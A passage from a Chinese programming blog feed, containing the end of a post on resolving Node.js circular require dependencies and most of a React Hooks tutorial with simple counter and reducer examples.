class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>B.js</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="built_in">require</span>(<span class="string">&#x27;./A&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;B: before logging a&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;B: after logging a&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">B</span>: <span class="string">&#x27;this is b Object&#x27;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>运行 <code>A.js</code>，将会看到如下输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">B: before logging a</span><br><span class="line">&#123;&#125;</span><br><span class="line">B: after logging a</span><br><span class="line">A: before logging b</span><br><span class="line">&#123; B: &#x27;this is b Object&#x27; &#125;</span><br><span class="line">A: after logging b</span><br></pre></td></tr></table></figure><p>JavaScript 作为一门解释型的语言，上面的打印输出清晰的展示出了程序运行的轨迹。在这个例子中，<code>A.js</code> 首先 <code>require</code> 了 <code>B.js</code>, 程序进入 <code>B.js</code>，在 <code>B.js</code> 中第一行又 <code>require</code> 了 <code>A.js</code>。</p><p>如前文所述，为了避免无限循环的模块依赖，在 Node.js 运行 <code>A.js</code> 之后，它就被缓存了，但需要注意的是，此时缓存的仅仅是一个未完工的 <code>A.js</code>（an <strong>unfinished copy</strong> of the <code>a.js</code>）。所以在 <code>B.js</code> <code>require</code> <code>A.js</code> 时，得到的仅仅是缓存中一个未完工的 <code>A.js</code>，具体来说，它并没有明确被导出的具体内容（<code>A.js</code> 尾端）。所以 <code>B.js</code> 中输出的 <code>a</code> 是一个空对象。</p><p>之后，<code>B.js</code> 顺利执行完，回到 <code>A.js</code> 的 <code>require</code> 语句之后，继续执行完成。</p><h3 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a><a href="#解决问题" title="解决问题"></a>解决问题</h3><p>想要解决这个问题有一个很简明的方法，那就是在循环依赖的每个模块中先导出自身，然后再导入其他模块（对于本文的举例来说，实际只需改动 <code>A.js</code> 就可以达到效果）。</p><p>话不多说，放码过来：</p><p><code>A.js</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">A</span>: <span class="string">&#x27;this is a Object&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> b = <span class="built_in">require</span>(<span class="string">&#x27;./B&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;A: before log b&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;A: after log b&#x27;</span>);</span><br></pre></td></tr></table></figure><p><code>B.js</code>:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">B</span>: <span class="string">&#x27;this is b Object&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> a = <span class="built_in">require</span>(<span class="string">&#x27;./A&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;B: before log a&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;B: after log a&#x27;</span>);</span><br></pre></td></tr></table></figure><p>此时，在 A 和 B 中，都在 <code>require</code> 之前就导出了自身需要导出的模块，此时输出则是这样：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">B</span>: before log a</span><br><span class="line">&#123; <span class="attr">A</span>: <span class="string">&#x27;this is a Object&#x27;</span> &#125;</span><br><span class="line"><span class="attr">B</span>: after log a</span><br><span class="line"><span class="attr">A</span>: before log b</span><br><span class="line">&#123; <span class="attr">B</span>: <span class="string">&#x27;this is b Object&#x27;</span> &#125;</span><br><span class="line"><span class="attr">A</span>: after log b</span><br></pre></td></tr></table></figure><p>可以看到 B 中按我们的预期输出了 A 中导出的值。</p><p>这种解决办法可行的原因也很简单，还是因为 JavaScript 是一门解释型的语言，在 <code>require</code> 其他模块之前，已经把自身需要导出的部分都导出了，所以即便有模块载入缓存，也不影响最终结果按预期进行。</p><p>这种办法几乎没什么副作用，唯一稍令强迫症感到不快就是这种顺序与我们通常的书写顺序不符。一般我们都会先把 <code>require</code> 写在源文件开头，<code>exports</code> 放到后面的位置。唯一需要祈祷的是，之后接手项目的代码猴儿不会因为觉得这个顺序看着碍眼又把它改回去。鉴于此点，<strong>在导入导出语句上添加合理的解释性注释变得很重要</strong>。</p><h3 id="其他相关问题"><a href="#其他相关问题" class="headerlink" title="其他相关问题"></a><a href="#其他相关问题" title="其他相关问题"></a>其他相关问题</h3><p>实际上，我还自己实验并查阅了一些资料来探索是否有其他的解决办法，但那些办法要么是适用于特定的情形和设计模式之下，要么就没有上述方法简洁，本文就不赘述了。如果有兴趣，可以参看本文末尾的 References 链接。如果你发现有更好的解决办法，欢迎在评论区留言。</p><p>要想彻底弄明白 Node.js 模块加载的相关问题，一定得去读读 Node.js 相关部分的源码。其次，推荐阅读<a href="https://book.douban.com/subject/25768396/">《深入浅出 Node.js》</a>第二章与<a href="http://www.ruanyifeng.com/blog/2015/05/require.html">阮一峰的这篇日志</a>。</p><p>有趣的是，ES6 特性中已经有了更优秀的 <code>import/export</code> 模块加载机制，就不会存在这样的问题（原因参考 References 第 5 条），然而 Node.js 还并不支持。Github 上有人提出过这个问题，Node.js 基金会成员 <a href="https://github.com/bnoordhuis">@bnoordhuis</a> 对此的回复是：</p><blockquote><p>In a nutshell, <code>require()</code> is not going anywhere - removing it would break too much for too little gain - but we’ll almost certainly end up supporting ES6 import/export somehow, details TBD.</p><p>Support for ES6 modules first needs to land in V8.</p></blockquote><p>详细的讨论可以到<a href="https://github.com/nodejs/help/issues/53">这里</a>查看。</p><p>虽然因为 V8 的原因 Node.js 官方还不能支持 <code>import/export</code>，不过我们依然可以借助 Babel 来提前在 Node.js 使用这个特性，感兴趣的同学可以参考<a href="http://taobaofed.org/blog/2016/01/07/find-back-the-lost-es6-features-in-nodejs/">这里</a>。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
          <category> Node </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>React Hooks使用教程及演示</title>
      <link href="/2020/02/99b5921d8023.html"/>
      <url>/2020/02/99b5921d8023.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-函数式组件"><a href="#1-函数式组件" class="headerlink" title="1. 函数式组件"></a>1. 函数式组件</h1><p>在新版本的 React 中，可以将组件直接导出为一个函数使用，即为函数式组件：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>  <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Example</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      hi~</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Example</span>;</span><br></pre></td></tr></table></figure><p>函数式组件有以下几个优点：</p><ul><li>没有生命周期</li><li>无组件实例，没有 <code>this</code></li><li>没有内部状态(state)</li></ul><p>函数式组件也有以下几个优点：</p><ul><li>不需要声明 <code>class</code>，没有 <code>constructor</code>、<code>extends</code>等代码，代码简洁，占用内存小。</li><li>不需要使用 <code>this</code></li><li>可以写成无副作用的纯函数。</li><li>更佳的性能。函数式组件没有了生命周期，不需要对这部分进行管理，从而保证了更好地性能。</li></ul><p>同时，其也有不可避免的一些缺点：</p><ul><li>没有生命周期方法。</li><li>没有实例化。</li><li>没有 <code>shouldComponentUpdate</code> ，不能避免重复渲染。</li></ul><h1 id="2-useState"><a href="#2-useState" class="headerlink" title="2. useState"></a>2. useState</h1><p><code>useState</code> 可以帮助我们代替原有的 state ，更好的去使用 state ，我们可以按照如下方法定义一个简单的累加器：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123; useState &#125; <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Example</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = <span class="title function_">useState</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>You clicked &#123;count&#125; times<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-xml">          setCount(count + 1);</span></span><br><span class="line"><span class="language-xml">        &#125;&#125;</span></span><br><span class="line"><span class="language-xml">      &gt;</span></span><br><span class="line"><span class="language-xml">        点我</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Example</span>;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/12/20/IWPfhZqu3UcovRr.png" alt="累加器"></p><p><code>useState()</code> 方法的返回值为一个记录值以及修改该值的 <code>set</code> 方法，其传入的参数是一个记录值的初始值，我们可以使用数组结构赋值取出这两部分，通过输出 <code>useState(1)</code> 我们可以看到返回值的结构：</p><p><img src="https://i.loli.net/2019/12/20/OhbK1JHESidYto8.png" alt="useState(1) 的返回值"></p><h1 id="3-useEffect"><a href="#3-useEffect" class="headerlink" title="3. useEffect"></a>3. useEffect</h1><p>从字面意思上来看，<code>useEffect</code> 即为产生副作用，其可以按照如同 <code>useState</code> 方法一样去引入：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123; useState, useEffect &#125; <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br></pre></td></tr></table></figure><p>使用方法也相同：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Example</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// Do sometiong here</span></span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="comment">// DOM here</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其类似于 React 的 <code>ComponentDidMount</code> 与 <code>ComponentDidUpdate</code> 生命周期函数，也就是说其会在组件挂载时与组件更新时被调用，并会对组件产生一定的副作用，同时其也时异步调用的。</p><p>同时，<code>useEffect()</code> 方法第一个参数位传入的函数，允许返回一个额外的函数，这个函数将在组件被移除时调用，相当于 <code>componentWillUnmount()</code> 生命周期函数：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Example</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;useEffect&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;useEffect return&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="comment">// DOM here</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是我们会发现，虽然组件在挂载时会触发 <code>useEffect()</code> 第一个参数的函数，在组件被卸载时会触发 <code>useEffect()</code> 第一个参数的函数的返回函数。但是每当组件内的状态被更新，或者父组件更新导致子组件也被刷新时，两个函数都会被各执行一次，仔细梳理一下我们得出结论：</p><ul><li><code>useEffect()</code> 第一个参数的函数的作用 = <code>componentDidMount()</code> + <code>componentDidUpdate()</code></li><li><code>useEffect()</code> 第一个参数的函数的返回值的作用 = <code>componentWillUpdate()</code> + <code>componentWillUnmount()</code></li></ul><p>那么我们如何控制函数的触发时间呢，这就要使用 <code>useEffect</code> 的第二个参数，其是一个数组，代表着当哪个 state 发生变化时会执行 <code>useState()</code> 第一个参数传入的函数，如：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Example</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = <span class="title function_">useState</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;只在组件挂载与 count 更新时被调用&quot;</span>);</span><br><span class="line">  &#125;, [count]);</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="comment">// DOM here</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不论数组中的内容时什么，<code>userEffect()</code> 第一个参数传入的函数与其返回的函数都会在组件被挂载与销毁时被调用，因此，只要留空的话，就可以达到 <code>componentDidMount()</code> 与 <code>componentWillUnmount()</code> 只执行一次的效果：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Example</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;componentDidMount&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">componentWillUnmount</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, []);</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="comment">// DOM here</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="4-createContext-useContent"><a href="#4-createContext-useContent" class="headerlink" title="4. createContext useContent"></a>4. createContext useContent</h1><p>React Hock 提供了一个组件间传递数据的方式 —— 使用 <code>createContext()</code> 与 <code>useContent()</code> 创建与使用上下文，其主要的思想就是创建一个 Context 上下文对象，在父组件中向子组件传递这个对象，那么子组件就可以获取父组件的数据，示例如下：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123; useState, createContext, useContext &#125; <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个上下文对象，用于传递 count</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">CountContext</span> = <span class="title function_">createContext</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建子组件</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Counter</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 使用父组件传递的上下文对象并取出 count 值</span></span><br><span class="line">  <span class="keyword">let</span> count = <span class="title function_">useContext</span>(<span class="title class_">CountContext</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;count&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建父组件</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Example</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>You clicked &#123;count&#125; times<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        // 按钮点击一次 <span class="attr">count</span> 数值累加 <span class="attr">1</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">        <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-xml">          setCount(count + 1);</span></span><br><span class="line"><span class="language-xml">        &#125;&#125;</span></span><br><span class="line"><span class="language-xml">      &gt;</span></span><br><span class="line"><span class="language-xml">        点我</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      &#123;// 创建一个传递上下文的组件&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">CountContext.Provider</span> <span class="attr">value</span>=<span class="string">&#123;count&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        &#123;// 引入子组件&#125;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">Counter</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">CountContext.Provider</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Example</span>;</span><br></pre></td></tr></table></figure><h1 id="5-useReducer"><a href="#5-useReducer" class="headerlink" title="5. useReducer"></a>5. useReducer</h1><p>首先回顾一下 Redux 中 Reducer 的写法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ./store/reducer.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> (state = defaultState, action) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (action.<span class="property">type</span> === <span class="string">&#x27;change_input_value&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> newState = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(state));</span><br><span class="line">    newState.<span class="property">inputValue</span> = action.<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">return</span> newState;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> state;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 ReactHocks 中，useReducer 的概念与写法与 Redux 的一致。<code>useReducer(reducer, initialArg, init)</code> 方法提供了三个参数：</p><p>第一个参数为一个 reducer 函数，该 reducer 函数中提供了两个参数，分别为当前的 state 与派发的 action，我们在 reducer 函数中可以通过判断 action 的值来选择性修改 state 的数据；</p><p>第二个参数为 state 提供了一个默认值，也就是 defaultState；</p><p>第三个参数为惰性初始化 state 的函数，具体使用可见 <a href="https://zh-hans.reactjs.org/docs/hooks-reference.html#usereducer">官方文档</a>，我们在此暂时不会用到。</p><p>最终 <code>useReducer()</code> 方法返回了一个 <code>state</code> 与一个 <code>dispath</code> 对象，分别用来读取 state 的数据与派发 action 。</p><p>因此，我们可以使用 <code>useReducer</code> 来替代 <code>useState</code>：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123; useReducer &#125; <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ReducerDemo</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> defaultState = &#123;</span><br><span class="line">    <span class="attr">count</span>: <span class="number">0</span></span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">const</span> [state, dispatch] = <span class="title function_">useReducer</span>(<span class="function">(<span class="params">state, action</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> newState = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(state));</span><br><span class="line">    <span class="keyword">switch</span> (action) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;add&quot;</span>:</span><br><span class="line">        newState.<span class="property">count</span> = state.<span class="property">count</span> + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> newState;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;sub&quot;</span>:</span><br><span class="line">        newState.<span class="property">count</span> = state.<span class="property">count</span> - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> newState;</span><br><span class="line">      <span class="attr">default</span>:</span><br><span class="line">        <span class="keyword">return</span> state;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, defaultState);</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h2</span>&gt;</span>现在的分数是&#123;state.count&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> dispatch(&quot;sub&quot;)&#125;&gt;Decrement<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span> =&gt;</span> dispatch(&quot;add&quot;)&#125;&gt;Increment<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">ReducerDemo</span>;</span><br></pre></td></tr></table></figure><p><img src="http://study.esunr.xyz/1578222613439.png" alt="实现效果"></p><h1 id="6-useContext-与-useReducer-替代-Redux"><a href="#6-useContext-与-useReducer-替代-Redux" class="headerlink" title="6. useContext 与 useReducer 替代 Redux"></a>6. useContext 与 useReducer 替代 Redux</h1><p><code>useContext</code>：可访问全局状态，避免一层层的传递状态。这符合 <code>Redux</code> 其中的一项规则，就是状态全局化，并能统一管理。</p><p><code>useReducer</code>：通过action的传递，更新复杂逻辑的状态，主要是可以实现类似 <code>Redux</code> 中的 <code>Reducer</code> 部分，实现业务逻辑的可行性。</p><p>因此，将两者结合可以实现 Redux 的效果，在组件之间传递数据，接下来我们演示一个利用按钮组件控制显示组件显示的字体颜色的 Demo，其中涉及了组件之间数据的传递，我们在这里使用了 <code>useContext</code> 与 <code>useReducer</code>。</p><p>首先，我们来看一下界面的 UI：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200207152525.png" alt="默认字体为蓝色"></p><p><img src="http://img.cdn.esunr.xyz/markdown/20200207152558.png" alt="点击后变为红色"></p><p><img src="http://img.cdn.esunr.xyz/markdown/20200207152617.png" alt="点击后变为黄色"></p><p>我们可以将页面拆分为两个组件，<code>&lt;ShowArea /&gt;</code> 组件与 <code>&lt;Buttons /&gt;</code> 组件：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20200207153337.png" alt=""></p><p>我们在当前页面引入这两个组件：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td 